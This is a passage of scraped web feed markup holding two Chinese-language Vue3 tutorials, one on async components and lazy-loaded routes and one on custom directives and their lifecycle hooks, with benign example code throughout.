      <span class="hljs-attr">loader</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/UserProfile.vue'</span>),
      <span class="hljs-attr">loadingComponent</span>: <span class="hljs-title class_">LoadingSpinner</span>,
      <span class="hljs-attr">errorComponent</span>: <span class="hljs-title class_">ErrorDisplay</span>,
      <span class="hljs-attr">delay</span>: <span class="hljs-number">200</span>,
      <span class="hljs-attr">timeout</span>: <span class="hljs-number">3000</span>
    })
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/admin'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Admin'</span>,
    <span class="hljs-comment">// 条件性异步加载（基于用户权限）</span>
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">const</span> user = store.<span class="hljs-property">getters</span>.<span class="hljs-property">currentUser</span>
      <span class="hljs-keyword">if</span> (user?.<span class="hljs-property">isAdmin</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/AdminDashboard.vue'</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/AccessDenied.vue'</span>)
      }
    }
  }
]

<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
  <span class="hljs-attr">history</span>: <span class="hljs-title function_">createWebHistory</span>(),
  routes
})

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router
</code></pre>
<h4 data-id="heading-16"><strong>5.2 路由组件示例</strong></h4>
<p><strong>views/UserProfile.vue</strong>：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="user-profile-page"&gt;
    &lt;div class="header"&gt;
      &lt;h1&gt;用户详情&lt;/h1&gt;
      &lt;p&gt;用户ID: {{ $route.params.id }}&lt;/p&gt;
    &lt;/div&gt;
    
    &lt;Suspense&gt;
      &lt;template #default&gt;
        &lt;UserDetailContent :user-id="$route.params.id" /&gt;
      &lt;/template&gt;
      &lt;template #fallback&gt;
        &lt;div class="page-loading"&gt;
          &lt;h3&gt;加载用户信息...&lt;/h3&gt;
        &lt;/div&gt;
      &lt;/template&gt;
    &lt;/Suspense&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { defineAsyncComponent } from 'vue'

// 异步加载用户详情内容
const UserDetailContent = defineAsyncComponent({
  loader: () =&gt; import('../components/UserDetailContent.vue'),
  loadingComponent: {
    template: '&lt;div&gt;加载用户详情...&lt;/div&gt;'
  }
})
&lt;/script&gt;
</code></pre>
<hr/>
<h3 data-id="heading-17"><strong>六、 高级模式与最佳实践</strong></h3>
<h4 data-id="heading-18"><strong>6.1 预加载策略</strong></h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="app"&gt;
    &lt;nav&gt;
      &lt;router-link to="/"&gt;首页&lt;/router-link&gt;
      &lt;router-link to="/about" @mouseenter="preloadAbout"&gt;关于&lt;/router-link&gt;
      &lt;router-link to="/contact" @touchstart="preloadContact"&gt;联系&lt;/router-link&gt;
    &lt;/nav&gt;
    &lt;router-view /&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { defineAsyncComponent } from 'vue'

// 预加载函数
const preloadAbout = () =&gt; {
  // 预加载关于页面
  import('./views/About.vue').then(module =&gt; {
    console.log('关于页面预加载完成')
  })
}

const preloadContact = () =&gt; {
  // 预加载联系页面（移动端 touchstart 事件）
  import('./views/Contact.vue')
}

// 关键组件预加载（在空闲时间）
const preloadCriticalComponents = () =&gt; {
  if ('requestIdleCallback' in window) {
    requestIdleCallback(() =&gt; {
      import('./components/CriticalComponent.vue')
    })
  }
}

// 应用启动后预加载关键组件
onMounted(() =&gt; {
  preloadCriticalComponents()
})
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-19"><strong>6.2 错误边界与重试机制</strong></h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;ErrorBoundary&gt;
      &lt;template #default&gt;
        &lt;UnstableAsyncComponent /&gt;
      &lt;/template&gt;
      &lt;template #fallback="{ error, reset }"&gt;
        &lt;div class="error-boundary"&gt;
          &lt;h3&gt;组件加载失败&lt;/h3&gt;
          &lt;p&gt;{{ error.message }}&lt;/p&gt;
          &lt;button @click="reset"&gt;重试&lt;/button&gt;
        &lt;/div&gt;
      &lt;/template&gt;
    &lt;/ErrorBoundary&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { defineAsyncComponent, ref, onErrorCaptured } from 'vue'

// 错误边界组件
const ErrorBoundary = {
  setup(props, { slots }) {
    const error = ref(null)
    
    const reset = () =&gt; {
      error.value = null
    }
    
    onErrorCaptured((err) =&gt; {
      error.value = err
      return false // 阻止错误继续向上传播
    })
    
    return () =&gt; {
      if (error.value) {
        return slots.fallback?.({ error: error.value, reset })
      }
      return slots.default?.()
    }
  }
}

// 不稳定的异步组件（模拟可能失败）
const UnstableAsyncComponent = defineAsyncComponent({
  loader: async () =&gt; {
    // 模拟随机失败
    if (Math.random() &gt; 0.5) {
      throw new Error('随机加载失败')
    }
    await new Promise(resolve =&gt; setTimeout(resolve, 1000))
    return import('./components/UnstableComponent.vue')
  },
  onError: (error, retry, fail, attempts) =&gt; {
    if (attempts &lt;= 3) {
      // 重试最多3次
      console.log(`重试加载，尝试次数: ${attempts}`)
      retry()
    } else {
      fail()
    }
  }
})
&lt;/script&gt;
</code></pre>
<hr/>
<h3 data-id="heading-20"><strong>七、 性能优化与调试技巧</strong></h3>
<h4 data-id="heading-21"><strong>7.1 Webpack Bundle Analyzer</strong></h4>
<p>分析打包结果，优化代码分割：</p>
<pre><code class="hljs language-bash" lang="bash">npm install --save-dev webpack-bundle-analyzer
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vue.config.js</span>
<span class="hljs-keyword">const</span> { defineConfig } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'@vue/cli-service'</span>)
<span class="hljs-keyword">const</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'webpack-bundle-analyzer'</span>).<span class="hljs-property">BundleAnalyzerPlugin</span>

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">transpileDependencies</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">configureWebpack</span>: {
    <span class="hljs-attr">plugins</span>: [
      <span class="hljs-keyword">new</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span>({
        <span class="hljs-attr">analyzerMode</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'production'</span> ? <span class="hljs-string">'static'</span> : <span class="hljs-string">'disabled'</span>,
        <span class="hljs-attr">openAnalyzer</span>: <span class="hljs-literal">false</span>
      })
    ],
    <span class="hljs-attr">optimization</span>: {
      <span class="hljs-attr">splitChunks</span>: {
        <span class="hljs-attr">chunks</span>: <span class="hljs-string">'all'</span>,
        <span class="hljs-attr">cacheGroups</span>: {
          <span class="hljs-attr">vendor</span>: {
            <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]node_modules[\\/]/</span>,
            <span class="hljs-attr">name</span>: <span class="hljs-string">'vendors'</span>,
            <span class="hljs-attr">chunks</span>: <span class="hljs-string">'all'</span>
          }
        }
      }
    }
  }
})
</code></pre>
<h4 data-id="heading-22"><strong>7.2 性能监控</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// utils/performance.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">trackComponentLoad</span> = (<span class="hljs-params">componentName, startTime</span>) =&gt; {
  <span class="hljs-keyword">const</span> loadTime = performance.<span class="hljs-title function_">now</span>() - startTime
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`🚀 <span class="hljs-subst">${componentName}</span> 加载耗时: <span class="hljs-subst">${loadTime.toFixed(<span class="hljs-number">2</span>)}</span>ms`</span>)
  
  <span class="hljs-comment">// 发送到监控系统</span>
  <span class="hljs-keyword">if</span> (loadTime &gt; <span class="hljs-number">2000</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`⚠️ <span class="hljs-subst">${componentName}</span> 加载较慢`</span>)
  }
}

<span class="hljs-comment">// 在异步组件中使用</span>
<span class="hljs-keyword">const</span> startTime = performance.<span class="hljs-title function_">now</span>()
<span class="hljs-keyword">const</span> <span class="hljs-title class_">AsyncComponent</span> = <span class="hljs-title function_">defineAsyncComponent</span>({
  <span class="hljs-attr">loader</span>: <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-keyword">const</span> component = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./components/HeavyComponent.vue'</span>)
    <span class="hljs-title function_">trackComponentLoad</span>(<span class="hljs-string">'HeavyComponent'</span>, startTime)
    <span class="hljs-keyword">return</span> component
  }
})
</code></pre>
<hr/>
<h3 data-id="heading-23"><strong>八、 总结</strong></h3>
<p>Vue3 的异步组件系统提供了强大而灵活的工具来优化应用性能：</p>
<h4 data-id="heading-24"><strong>核心优势</strong></h4>
<ol>
<li><strong>减小初始包体积</strong>：显著提升首屏加载速度</li>
<li><strong>按需加载</strong>：只在需要时加载代码，节省带宽</li>
<li><strong>更好的缓存</strong>：独立 chunk 可独立缓存</li>
<li><strong>提升用户体验</strong>：合理的加载状态和错误处理</li>
</ol>
<h4 data-id="heading-25"><strong>技术选择指南</strong></h4>



































<table><thead><tr><th>场景</th><th>推荐方案</th><th>优点</th></tr></thead><tbody><tr><td>简单异步加载</td><td><code>defineAsyncComponent(() =&gt; import())</code></td><td>简洁直观</td></tr><tr><td>需要加载状态</td><td><code>defineAsyncComponent</code> 完整配置</td><td>完整的状态管理</td></tr><tr><td>现代应用</td><td><code>&lt;Suspense&gt;</code> + 异步组件</td><td>声明式、更优雅</td></tr><tr><td>路由级别</td><td>Vue Router 动态导入</td><td>天然的路由分割</td></tr><tr><td>复杂异步逻辑</td><td>组合式函数 + 异步组件</td><td>最大灵活性</td></tr></tbody></table>
<h4 data-id="heading-26"><strong>最佳实践提醒</strong></h4>
<ul>
<li>合理设置 <code>delay</code> 避免加载闪烁</li>
<li>始终处理加载错误情况</li>
<li>使用预加载提升关键路径性能</li>
<li>监控组件加载性能</li>
<li>合理划分代码分割点</li>
</ul>
<p>通过合理运用 Vue3 的异步组件特性，你可以构建出既快速又用户体验良好的现代 Web 应用。</p>
<hr/>
<p><strong>希望这篇深度解析能帮助你全面掌握 Vue3 的异步组件加载！如有任何问题，欢迎在评论区讨论。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3 自定义指令深度解析：从基础到高级应用的完整指南]]></title>    <link>https://juejin.cn/post/7575655132748005412</link>    <guid>https://juejin.cn/post/7575655132748005412</guid>    <pubDate>2025-11-23T03:31:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575655132748005412" data-draft-id="7575320672572244010" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3 自定义指令深度解析：从基础到高级应用的完整指南"/> <meta itemprop="keywords" content="Vue.js,前端"/> <meta itemprop="datePublished" content="2025-11-23T03:31:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="北辰alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3 自定义指令深度解析：从基础到高级应用的完整指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    北辰alk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T03:31:20.000Z" title="Sun Nov 23 2025 03:31:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>摘要</strong></h2>
<p>自定义指令是 Vue.js 中一个强大而灵活的特性，它允许开发者直接对 DOM 元素进行底层操作。Vue3 在保留自定义指令核心概念的同时，对其 API 进行了调整和优化，使其更符合组合式 API 的设计理念。本文将深入探讨 Vue3 中自定义指令的定义方式、生命周期钩子、使用场景和最佳实践，通过丰富的代码示例和清晰的流程图，帮助你彻底掌握这一重要特性。</p>
<hr/>
<h2 data-id="heading-1"><strong>一、 什么是自定义指令？为什么需要它？</strong></h2>
<h3 data-id="heading-2"><strong>1.1 自定义指令的概念</strong></h3>
<p>在 Vue.js 中，指令是带有 <code>v-</code> 前缀的特殊属性。除了 Vue 内置的指令（如 <code>v-model</code>、<code>v-show</code>、<code>v-if</code> 等），Vue 还允许我们注册自定义指令，用于对普通 DOM 元素进行底层操作。</p>
<h3 data-id="heading-3"><strong>1.2 使用场景</strong></h3>
<p>自定义指令在以下场景中特别有用：</p>
<ol>
<li><strong>DOM 操作</strong>：焦点管理、文本选择、元素拖拽</li>
<li><strong>输入限制</strong>：格式化输入内容、阻止无效字符</li>
<li><strong>权限控制</strong>：根据权限显示/隐藏元素</li>
<li><strong>集成第三方库</strong>：与 jQuery 插件、图表库等集成</li>
<li><strong>性能优化</strong>：图片懒加载、无限滚动</li>
<li><strong>用户体验</strong>：点击外部关闭、滚动加载更多</li>
</ol>
<h3 data-id="heading-4"><strong>1.3 Vue2 与 Vue3 自定义指令的区别</strong></h3>






























<table><thead><tr><th>特性</th><th>Vue2</th><th>Vue3</th></tr></thead><tbody><tr><td><strong>生命周期钩子</strong></td><td><code>bind</code>, <code>inserted</code>, <code>update</code>, <code>componentUpdated</code>, <code>unbind</code></td><td><code>created</code>, <code>beforeMount</code>, <code>mounted</code>, <code>beforeUpdate</code>, <code>updated</code>, <code>beforeUnmount</code>, <code>unmounted</code></td></tr><tr><td><strong>参数传递</strong></td><td><code>el</code>, <code>binding</code>, <code>vnode</code>, <code>oldVnode</code></td><td><code>el</code>, <code>binding</code>, <code>vnode</code>, <code>prevVnode</code></td></tr><tr><td><strong>注册方式</strong></td><td>全局 <code>Vue.directive()</code>，局部 <code>directives</code> 选项</td><td>全局 <code>app.directive()</code>，局部 <code>directives</code> 选项</td></tr><tr><td><strong>与组合式API集成</strong></td><td>有限</td><td>更好，可在 setup 中使用</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-5"><strong>二、 自定义指令的基本结构</strong></h2>
<h3 data-id="heading-6"><strong>2.1 指令的生命周期钩子</strong></h3>
<p>Vue3 中的自定义指令包含一系列生命周期钩子，这些钩子在指令的不同阶段被调用：</p>
<p><strong>流程图：自定义指令生命周期</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[指令创建] --&gt; B[created&lt;br&gt;元素属性/事件监听器应用之前]
    B --&gt; C[beforeMount&lt;br&gt;元素挂载到DOM之前]
    C --&gt; D[mounted&lt;br&gt;元素挂载到DOM之后]
    D --&gt; E{指令绑定值变化?}
    E -- 是 --&gt; F[beforeUpdate&lt;br&gt;元素更新之前]
    F --&gt; G[updated&lt;br&gt;元素更新之后]
    E -- 否 --&gt; H[元素卸载]
    H --&gt; I[beforeUnmount&lt;br&gt;元素卸载之前]
    I --&gt; J[unmounted&lt;br&gt;元素卸载之后]
</code></pre>
<h3 data-id="heading-7"><strong>2.2 钩子函数参数</strong></h3>
<p>每个生命周期钩子函数都会接收以下参数：</p>
<ul>
<li><strong><code>el</code></strong>：指令绑定的元素，可以直接操作 DOM</li>
<li><strong><code>binding</code></strong>：一个对象，包含指令的相关信息</li>
<li><strong><code>vnode</code></strong>：Vue 编译生成的虚拟节点</li>
<li><strong><code>prevVnode</code></strong>：上一个虚拟节点（仅在 <code>beforeUpdate</code> 和 <code>updated</code> 中可用）</li>
</ul>
<p><strong>binding 对象结构：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-attr">value</span>:        any,        <span class="hljs-comment">// 指令的绑定值，如 v-my-directive="value"</span>
  <span class="hljs-attr">oldValue</span>:     any,        <span class="hljs-comment">// 指令绑定的前一个值</span>
  <span class="hljs-attr">arg</span>:          string,     <span class="hljs-comment">// 指令的参数，如 v-my-directive:arg</span>
  <span class="hljs-attr">modifiers</span>:    object,     <span class="hljs-comment">// 指令的修饰符对象，如 v-my-directive.modifier</span>
  <span class="hljs-attr">instance</span>:     <span class="hljs-title class_">Component</span>,  <span class="hljs-comment">// 使用指令的组件实例</span>
  <span class="hljs-attr">dir</span>:          object      <span class="hljs-comment">// 指令的定义对象</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-8"><strong>三、 定义自定义指令的多种方式</strong></h2>
<h3 data-id="heading-9"><strong>3.1 全局自定义指令</strong></h3>
<p>全局指令在整个 Vue 应用中都可用。</p>
<h4 data-id="heading-10"><strong>方式一：使用 <code>app.directive()</code></strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)

<span class="hljs-comment">// 定义全局焦点指令</span>
app.<span class="hljs-title function_">directive</span>(<span class="hljs-string">'focus'</span>, {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el</span>) {
    el.<span class="hljs-title function_">focus</span>()
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'元素获得焦点'</span>)
  }
})

<span class="hljs-comment">// 定义全局颜色指令（带参数和值）</span>
app.<span class="hljs-title function_">directive</span>(<span class="hljs-string">'color'</span>, {
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">el, binding</span>) {
    el.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = binding.<span class="hljs-property">value</span>
  },
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    el.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = binding.<span class="hljs-property">value</span>
  }
})

app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<h4 data-id="heading-11"><strong>方式二：使用插件形式</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// directives/index.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> focusDirective = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el</span>) {
    el.<span class="hljs-title function_">focus</span>()
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> colorDirective = {
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">el, binding</span>) {
    el.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = binding.<span class="hljs-property">value</span>
  },
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    el.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = binding.<span class="hljs-property">value</span>
  }
}

<span class="hljs-comment">// 注册所有指令</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">registerDirectives</span>(<span class="hljs-params">app</span>) {
  app.<span class="hljs-title function_">directive</span>(<span class="hljs-string">'focus'</span>, focusDirective)
  app.<span class="hljs-title function_">directive</span>(<span class="hljs-string">'color'</span>, colorDirective)
}

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">import</span> { registerDirectives } <span class="hljs-keyword">from</span> <span class="hljs-string">'./directives'</span>

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
<span class="hljs-title function_">registerDirectives</span>(app)
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<h3 data-id="heading-12"><strong>3.2 局部自定义指令</strong></h3>
<p>局部指令只在特定组件中可用。</p>
<h4 data-id="heading-13"><strong>选项式 API</strong></h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;input v-focus-local placeholder="局部焦点指令" /&gt;
    &lt;p v-color-local="textColor"&gt;这个文本颜色会变化&lt;/p&gt;
    &lt;button @click="changeColor"&gt;改变颜色&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  data() {
    return {
      textColor: 'red'
    }
  },
  methods: {
    changeColor() {
      this.textColor = this.textColor === 'red' ? 'blue' : 'red'
    }
  },
  directives: {
    // 局部焦点指令
    'focus-local': {
      mounted(el) {
        el.focus()
      }
    },
    // 局部颜色指令
    'color-local': {
      beforeMount(el, binding) {
        el.style.color = binding.value
      },
      updated(el, binding) {
        el.style.color = binding.value
      }
    }
  }
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-14"><strong>组合式 API</strong></h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;input v-focus-local placeholder="局部焦点指令" /&gt;
    &lt;p v-color-local="textColor"&gt;这个文本颜色会变化&lt;/p&gt;
    &lt;button @click="changeColor"&gt;改变颜色&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref } from 'vue'

const textColor = ref('red')

const changeColor = () =&gt; {
  textColor.value = textColor.value === 'red' ? 'blue' : 'red'
}

// 局部自定义指令
const vFocusLocal = {
  mounted(el) {
    el.focus()
  }
}

const vColorLocal = {
  beforeMount(el, binding) {
    el.style.color = binding.value
  },
  updated(el, binding) {
    el.style.color = binding.value
  }
}
&lt;/script&gt;
</code></pre>
<hr/>
<h2 data-id="heading-15"><strong>四、 完整生命周期示例</strong></h2>
<p>让我们通过一个完整的示例来演示所有生命周期钩子的使用：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="demo-container"&gt;
    &lt;h2&gt;自定义指令完整生命周期演示&lt;/h2&gt;
    
    &lt;div&gt;
      &lt;button @click="toggleDisplay"&gt;{{ isVisible ? '隐藏' : '显示' }}元素&lt;/button&gt;
      &lt;button @click="changeMessage"&gt;改变消息&lt;/button&gt;
      &lt;button @click="changeColor"&gt;改变颜色&lt;/button&gt;
    &lt;/div&gt;

    &lt;div v-if="isVisible" v-lifecycle-demo:arg.modifier="directiveValue" 
         class="demo-element" :style="{ color: elementColor }"&gt;
      {{ message }}
    &lt;/div&gt;

    &lt;div class="log-container"&gt;
      &lt;h3&gt;生命周期日志：&lt;/h3&gt;
      &lt;div v-for="(log, index) in logs" :key="index" class="log-item"&gt;
        {{ log }}
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref, reactive } from 'vue'

const isVisible = ref(false)
const message = ref('Hello, Custom Directive!')
const elementColor = ref('#333')
const logs = ref([])

const directiveValue = reactive({
  text: '指令值对象',
  count: 0
})

// 添加日志函数
const addLog = (hookName, el, binding) =&gt; {
  const log = `[${new Date().toLocaleTimeString()}] ${hookName}: value=${JSON.stringify(binding.value)}, arg=${binding.arg}`
  logs.value.push(log)
